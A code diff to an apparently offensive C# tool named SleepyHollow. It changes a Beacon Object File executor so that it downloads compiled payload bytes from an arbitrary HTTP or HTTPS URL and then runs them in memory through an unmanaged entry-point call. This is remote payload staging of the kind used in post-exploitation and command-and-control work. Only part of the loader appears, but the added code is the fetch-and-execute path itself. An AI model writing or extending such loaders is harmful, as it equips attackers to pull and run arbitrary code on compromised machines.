@@ -1,7 +1,4 @@
 ﻿using SleepyHollow.Bof.Types;
-using System;
-using System.Diagnostics;
-using System.Reflection;
 using System.Runtime.InteropServices;
 
 namespace SleepyHollow.Bof;
@@ -10,9 +7,32 @@ internal class BeaconObjectExecutor(string file)
 {
     [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
     private delegate void GoDelegate();
-    public void Run()
+    public async Task RunAsync()
     {
-        var bofData = File.ReadAllBytes(file);
+        byte[] bofData = null;
+        if (TryParseUrl(file, out var uriLocation))
+        {
+            if (RuntimeConfig.IsDebugEnabled)
+                Console.WriteLine($"Downloading BOF from URL: {uriLocation}");
+            using var client = new HttpClient();
+            var response = await client.GetAsync(uriLocation);
+            if (!response.IsSuccessStatusCode)
+            {
+                Console.WriteLine($"Failed to download BOF from {uriLocation}. Status code: {response.StatusCode}");
+                Environment.Exit(1);
+            }
+
+            bofData = await response.Content.ReadAsByteArrayAsync();
+        }
+        else if (File.Exists(file))
+        {
+            bofData = File.ReadAllBytes(file);
+        }
+        else
+        {
+            Console.WriteLine($"BOF file not found: {file}");
+            return;
+        }
         if (bofData.Length == 0)
         {
             Console.WriteLine("Failed to download BOF data.");
@@ -29,7 +49,18 @@ internal class BeaconObjectExecutor(string file)
         }
     }
 
-    private void ExecuteEntryPoint(IntPtr entryAddress)
+    private static bool TryParseUrl(string path, out Uri uriLocation)
+    {
+        uriLocation = null;
+        if ( Uri.TryCreate(path, UriKind.Absolute, out var uri) && (uri.Scheme == Uri.UriSchemeHttp || uri.Scheme == Uri.UriSchemeHttps))
+        {
+            uriLocation = uri;
+            return true;
+        }
+        return false;
+    }
+
+    private static void ExecuteEntryPoint(IntPtr entryAddress)
     {
         if (RuntimeConfig.IsDebugEnabled)
             Console.WriteLine($"Executing entry point at address: 0x{entryAddress:X}");
